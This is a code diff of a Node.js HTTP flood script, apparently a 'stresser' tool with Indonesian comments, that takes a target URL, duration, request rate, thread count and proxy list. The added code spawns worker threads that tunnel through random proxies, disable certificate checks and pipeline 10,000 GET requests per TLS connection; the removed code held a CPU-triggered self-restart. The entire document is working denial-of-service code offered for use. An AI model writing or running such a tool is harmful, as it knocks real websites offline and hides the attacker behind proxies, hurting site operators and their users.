@@ -2,8 +2,8 @@ const https = require('https');
 const fs = require('fs');
 const { Worker, isMainThread, workerData } = require('worker_threads');
 const { URL } = require('url');
-const os = require('os');
-const { exec } = require('child_process'); // Untuk mereset ulang proses
+const net = require('net');
+const tls = require('tls');
 
 if (isMainThread) {
     if (process.argv.length < 7) {
@@ -16,70 +16,60 @@ if (isMainThread) {
         time: parseInt(process.argv[3], 10),
         rps: parseInt(process.argv[4], 10),
         threads: parseInt(process.argv[5], 10),
-        proxyFile: process.argv[6]
+        proxyFile: process.argv[6],
+        requestsPerConnection: 10000 // Nilai sangat besar
     };
 
     console.log(`Starting attack on ${target.url} for ${target.time} seconds...`);
-    const worker = new Worker(__filename, { workerData: target });
-    worker.on('exit', () => console.log(`Attack on ${target.url} completed.`));
+    const workers = [];
+    for (let i = 0; i < target.threads; i++) {
+        workers.push(new Worker(__filename, { workerData: target }));
+    }
+    workers.forEach(worker => worker.on('exit', () => console.log(`Worker exited.`)));
 } else {
-    const { url, time, rps, threads, proxyFile } = workerData;
+    const { url, time, rps, threads, proxyFile, requestsPerConnection } = workerData;
     const target = new URL(url);
     const PROXY_LIST = proxyFile ? fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(p => p.trim()) : [];
 
-    const HTTP_OPTIONS = {
-        hostname: target.hostname,
-        port: target.port || 443,
-        path: target.pathname,
-        method: 'GET',
-        headers: {
-            'Host': target.hostname,
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' +
-                          '(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-            'Connection': 'keep-alive',
-            'Accept': '*/*',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Cache-Control': 'no-cache'  // Menambahkan header Cache-Control untuk mencegah caching
-        }
-    };
-
-    function sendRequest() {
-        const interval = setInterval(() => {
-            // Cek penggunaan CPU setiap detik
-            const cpuUsage = os.loadavg()[0]; // Mengambil load avg 1 menit
-            const memoryUsage = process.memoryUsage().rss / 1024 / 1024; // Mengambil penggunaan memori dalam MB
-
-            console.log(`SXUDIA STRESSER TELE @abibsaudia`);
-
-            // Jika penggunaan CPU lebih dari 98% (0.98 dari load average max 1)
-            if (cpuUsage > 0.98 * os.cpus().length) {
-                console.log("CPU usage exceeded 98%. Restarting the attack...");
-                clearInterval(interval);
-                exec('node ' + __filename + ' ' + process.argv.slice(2).join(' '), (error, stdout, stderr) => {
-                    if (error) {
-                        console.error(`exec error: ${error}`);
-                        return;
-                    }
-                    console.log(`stdout: ${stdout}`);
-                    console.error(`stderr: ${stderr}`);
-                });
-            }
-
-            // Kirim permintaan sesuai dengan rps dan threads
-            for (let i = 0; i < rps / threads; i++) {
-                const req = https.request(HTTP_OPTIONS, res => {
-                    res.on('data', () => {});
-                });
-                req.on('error', err => {});
-                req.end();
-            }
-        }, 1000);
-
-        // Menghentikan pengiriman request setelah waktu yang ditentukan
-        setTimeout(() => clearInterval(interval), time * 1000);
+    function sendRequest(proxy) {
+        const [proxyHost, proxyPort] = proxy.split(':');
+        const socket = net.connect(proxyPort, proxyHost, () => {
+            const tlsConn = tls.connect({
+                socket: socket,
+                host: target.hostname,
+                servername: target.hostname,
+                rejectUnauthorized: false
+            }, () => {
+                const payload = `GET ${target.pathname} HTTP/1.1\r\n` +
+                                `Host: ${target.hostname}\r\n` +
+                                `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ` +
+                                `(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n` +
+                                `Connection: keep-alive\r\n` +
+                                `Accept: */*\r\n` +
+                                `Accept-Encoding: gzip, deflate, br\r\n` +
+                                `Accept-Language: en-US,en;q=0.9\r\n\r\n`;
+                for (let i = 0; i < requestsPerConnection; i++) {
+                    tlsConn.write(payload);
+                }
+            });
+            tlsConn.on('error', () => {});
+        });
+        socket.on('error', () => {});
     }
 
-    // Mulai mengirim permintaan
-    sendRequest();
+    function startAttack() {
+        const attackInterval = setInterval(() => {
+            for (let i = 0; i < rps; i++) {
+                if (PROXY_LIST.length > 0) {
+                    const proxy = PROXY_LIST[Math.floor(Math.random() * PROXY_LIST.length)];
+                    sendRequest(proxy);
+                } else {
+                    sendRequest("127.0.0.1:8080");
+                }
+            }
+        }, 1000);
+        setTimeout(() => clearInterval(attackInterval), time * 1000);
+    }
+
+    startAttack();
 }
